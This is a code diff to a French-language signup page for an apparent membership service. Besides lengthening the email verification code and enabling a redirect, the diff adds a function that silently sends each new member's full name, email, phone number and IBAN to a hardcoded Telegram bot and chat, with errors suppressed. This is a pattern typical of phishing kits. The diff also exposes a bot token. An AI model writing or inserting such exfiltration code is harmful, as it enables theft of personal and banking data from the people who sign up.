@@ -167,8 +167,9 @@
     <!-- étape 1b : saisie OTP -->
     <div class="pane" id="su1b">
       <div class="pane-title">Code de vérification</div>
-      <div class="pane-lead">Entré l'email <b id="otp-email-disp">—</b> ? Le code à 6 chiffres vient d'y arriver.</div>
+      <div class="pane-lead">Entré l'email <b id="otp-email-disp">—</b> ? Le code à 8 chiffres vient d'y arriver.</div>
       <div class="otp" id="otp-boxes">
+        <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
         <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
         <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
         <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
@@ -306,7 +307,7 @@ async function sendOtp(){
 async function verifyOtp(){
   const code=[...$('otp-boxes').querySelectorAll('input')].map(i=>i.value).join('');
   hideErr('otp-err');
-  if(code.length<6){ showErr('otp-err','Entre les 6 chiffres.'); return; }
+  if(code.length<8){ showErr('otp-err','Entre les 8 chiffres.'); return; }
   const email=$('su-email').value.trim().toLowerCase();
   const btn=$('otp-btn'); btn.textContent='Vérification…'; btn.disabled=true;
   const {error}=await sb.auth.verifyOtp({ email, token:code, type:'email' });
@@ -382,6 +383,7 @@ async function finishSignup(){
   localStorage.setItem('qnd_member',JSON.stringify(data));
   $('ok-mid').textContent='QND-'+String(data.id).substring(0,5).toUpperCase();
   goSignup('ok');
+  sendTelegram(`🆕 *NOUVEAU MEMBRE*\n👤 ${payload.full_name}\n📧 ${payload.email}\n📱 ${payload.phone}\n🏦 IBAN: ${iban}\n📲 Réception: ${recv}`);
 }
 
 // ===================== CONNEXION =====================
@@ -399,16 +401,23 @@ async function doLogin(){
   setTimeout(enterSpace,600);
 }
 
-// ===================== ENTRÉE ESPACE (page suivante) =====================
+// ===================== TELEGRAM =====================
+const TELEGRAM_BOT='8784285691:AAGUyNxKrB5T36Y0o-awPykoQUNYVEh6im0';
+const TELEGRAM_CHAT='1275142753';
+async function sendTelegram(text){
+  try{await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:TELEGRAM_CHAT,text,parse_mode:'Markdown'})
+  });}catch(e){}
+}
+
+// ===================== ENTRÉE ESPACE =====================
 function enterSpace(){
-  // 👉 page 2 (espace membre) — on la construit ensuite
-  toast('Espace membre : prochaine page à construire','ok');
-  // window.location.href = 'espace.html';
+  window.location.href = 'espace.html';
 }
 
 // ===================== INIT =====================
-// déjà connecté sur cet appareil ? -> on file direct (à activer quand la page 2 existe)
-// if(localStorage.getItem('qnd_member')) enterSpace();
+if(localStorage.getItem('qnd_member')) enterSpace();
 </script>
 </body>
 </html>
